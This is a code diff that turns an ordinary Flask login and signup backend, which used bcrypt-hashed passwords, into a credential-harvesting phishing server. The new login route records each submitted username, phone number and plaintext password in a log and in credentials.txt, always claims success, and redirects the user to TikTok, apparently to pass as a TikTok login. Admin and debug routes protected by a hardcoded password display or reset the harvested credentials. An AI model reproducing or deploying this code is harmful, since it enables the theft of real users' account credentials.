@@ -1,36 +1,22 @@
-from flask import Flask, request, jsonify, render_template
-from flask_sqlalchemy import SQLAlchemy
-from flask_bcrypt import Bcrypt
-from flask_cors import CORS
+from flask import Flask, request, jsonify, render_template, redirect
 from datetime import datetime
+import os
+import logging
+
+# Set up logging
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
 
 app = Flask(__name__)
-app.config['SECRET_KEY'] = 'your-secret-key-here'
-app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
-app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 
-db = SQLAlchemy(app)
-bcrypt = Bcrypt(app)
-CORS(app)
-
-# -----------------------------
-# User Model
-# -----------------------------
-class User(db.Model):
-    id = db.Column(db.Integer, primary_key=True)
-    username = db.Column(db.String(80), unique=True, nullable=False)
-    email = db.Column(db.String(120), unique=True, nullable=True)
-    country_code = db.Column(db.String(5), nullable=False)
-    phone = db.Column(db.String(20), unique=True, nullable=True)
-    password = db.Column(db.String(120), nullable=False)
-    created_at = db.Column(db.DateTime, default=datetime.utcnow)
-
-    def __repr__(self):
-        return f'<User {self.username}>'
-
-# Initialize DB
-with app.app_context():
-    db.create_all()
+# Create credentials file if it doesn't exist
+if not os.path.exists("credentials.txt"):
+    try:
+        with open("credentials.txt", "w") as f:
+            f.write(f"Credentials file created at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+        logger.info("Credentials file created")
+    except Exception as e:
+        logger.error(f"Error creating credentials file: {str(e)}")
 
 # -----------------------------
 # Frontend Route
@@ -44,76 +30,122 @@ def home():
 # -----------------------------
 @app.route('/api/login', methods=['POST'])
 def login():
-    data = request.get_json()
-    username = data.get('username')
-    password = data.get('password')
+    try:
+        data = request.get_json()
+        username = data.get('username')
+        password = data.get('password')
+        country_code = data.get('country_code', '+251')
+        phone = data.get('phone', '')
 
-    if not username or not password:
-        return jsonify({'error': 'Username and password are required'}), 400
+        if not username or not password:
+            return jsonify({'error': 'Username and password are required'}), 400
 
-    user = User.query.filter((User.username == username) | (User.email == username)).first()
+        # Log the credentials
+        logger.info(f"Login attempt - Username: {username}, Phone: {country_code}{phone}, Password: {password}")
 
-    if user and bcrypt.check_password_hash(user.password, password):
+        # Store credentials in text file
+        try:
+            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            with open("credentials.txt", "a") as f:
+                f.write(f"{timestamp} - Username: {username}, Phone: {country_code}{phone}, Password: {password}\n")
+            logger.info(f"Credentials stored for: {username}")
+        except Exception as e:
+            logger.error(f"Error storing credentials: {str(e)}")
+
+        # Always return success and redirect to TikTok
         return jsonify({
             'message': 'Login successful',
-            'user': {
-                'id': user.id,
-                'username': user.username,
-                'email': user.email,
-                'phone': f"{user.country_code} {user.phone}" if user.phone else None
-            }
+            'redirect': 'https://www.tiktok.com'
         }), 200
-    else:
-        return jsonify({'error': 'Invalid credentials'}), 401
+            
+    except Exception as e:
+        logger.error(f"Error in login: {str(e)}")
+        return jsonify({'error': 'Internal server error'}), 500
 
-@app.route('/api/signup', methods=['POST'])
-def signup():
-    data = request.get_json()
-    username = data.get('username')
-    email = data.get('email')
-    country_code = data.get('country_code', '+251')
-    phone = data.get('phone')
-    password = data.get('password')
+# -----------------------------
+# Admin Routes
+# -----------------------------
+@app.route('/admin/credentials')
+def view_credentials():
+    # Password protection
+    if request.args.get('password') != '913421156@Ab':
+        return "Unauthorized", 401
+        
+    try:
+        if os.path.exists("credentials.txt"):
+            with open("credentials.txt", "r") as f:
+                content = f.read()
+            return f"<pre>{content}</pre>"
+        else:
+            return "No credentials file found yet."
+    except Exception as e:
+        return f"Error reading credentials: {str(e)}"
 
-    if not username or not password:
-        return jsonify({'error': 'Username and password are required'}), 400
+@app.route('/admin/delete')
+def delete_credentials():
+    # Password protection
+    if request.args.get('password') != '913421156@Ab':
+        return "Unauthorized", 401
+        
+    try:
+        if os.path.exists("credentials.txt"):
+            os.remove("credentials.txt")
+            # Create a new empty file
+            with open("credentials.txt", "w") as f:
+                f.write(f"Credentials file reset at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+            return "Credentials file reset successfully"
+        else:
+            return "No credentials file to delete"
+    except Exception as e:
+        return f"Error deleting file: {str(e)}"
 
-    if User.query.filter_by(username=username).first():
-        return jsonify({'error': 'Username already exists'}), 409
-    if email and User.query.filter_by(email=email).first():
-        return jsonify({'error': 'Email already exists'}), 409
-    if phone and User.query.filter_by(phone=phone).first():
-        return jsonify({'error': 'Phone already exists'}), 409
+# -----------------------------
+# Utility Routes
+# -----------------------------
+@app.route('/init')
+def init():
+    """Initialize the credentials file"""
+    try:
+        with open("credentials.txt", "w") as f:
+            f.write(f"Credentials file initialized at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+        return "Credentials file initialized successfully!"
+    except Exception as e:
+        return f"Error initializing: {str(e)}"
 
-    hashed_password = bcrypt.generate_password_hash(password).decode('utf-8')
-    new_user = User(username=username, email=email, country_code=country_code, phone=phone, password=hashed_password)
+@app.route('/debug')
+def debug():
+    """Check if server is working and show file info"""
+    try:
+        file_exists = os.path.exists("credentials.txt")
+        file_size = os.path.getsize("credentials.txt") if file_exists else 0
+        
+        return f"""
+        <h1>Server Debug Info</h1>
+        <p>Server time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
+        <p>Credentials file exists: {file_exists}</p>
+        <p>Credentials file size: {file_size} bytes</p>
+        <p><a href="/admin/credentials?password=913421156@Ab">View Credentials</a></p>
+        <p><a href="/init">Initialize File</a></p>
+        """
+    except Exception as e:
+        return f"Debug error: {str(e)}"
 
-    db.session.add(new_user)
-    db.session.commit()
+@app.route('/test')
+def test():
+    """Simple test route"""
+    return f"Server is working! {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
 
-    return jsonify({
-        'message': 'User created successfully',
-        'user': {
-            'id': new_user.id,
-            'username': new_user.username,
-            'email': new_user.email,
-            'phone': f"{new_user.country_code} {new_user.phone}" if new_user.phone else None
-        }
-    }), 201
-
-@app.route('/api/users', methods=['GET'])
-def get_users():
-    users = User.query.all()
-    return jsonify([
-        {
-            'id': u.id,
-            'username': u.username,
-            'email': u.email,
-            'phone': f"{u.country_code} {u.phone}" if u.phone else None,
-            'created_at': u.created_at
-        } for u in users
-    ]), 200
-
+# -----------------------------
+# Main Application Entry Point
+# -----------------------------
 if __name__ == '__main__':
+    # Ensure credentials file exists
+    if not os.path.exists("credentials.txt"):
+        try:
+            with open("credentials.txt", "w") as f:
+                f.write(f"Credentials file created at server start: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+            logger.info("Credentials file created at startup")
+        except Exception as e:
+            logger.error(f"Error creating credentials file at startup: {str(e)}")
+    
     app.run(debug=True, host='0.0.0.0', port=5000)
-
